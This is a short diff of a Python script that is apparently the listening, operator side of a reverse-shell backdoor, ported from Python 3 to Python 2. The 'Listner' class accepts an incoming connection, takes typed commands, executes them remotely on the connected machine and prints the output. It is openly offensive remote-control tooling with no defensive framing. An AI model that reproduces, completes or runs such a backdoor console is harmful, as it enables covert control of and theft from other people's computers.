@@ -1,4 +1,4 @@
-#!/usr/bin/python3
+#!/usr/bin/python2
 import socket
 import json
 
@@ -11,11 +11,11 @@ class Listner:
         listner.listen(0)
         print("[+] Waiting for incomming connections")
         self.conn,addr = listner.accept()
-        print("[+] Got a connection from",addr )
+        print("[+] Got a connection from" + str(addr) )
 
     def reliable_send(self,data):
         json_data = json.dumps(data)
-        self.conn.send(bytes(json_data))
+        self.conn.send(json_data)
 
     def reliable_recieve(self):
         json_data = self.conn.recv(1024)
@@ -27,7 +27,7 @@ class Listner:
 
     def run(self):
         while(True):
-            command = input(">> ")
+            command = raw_input(">> ")
             result = self.execute_remotely(command)
             print(result)
 
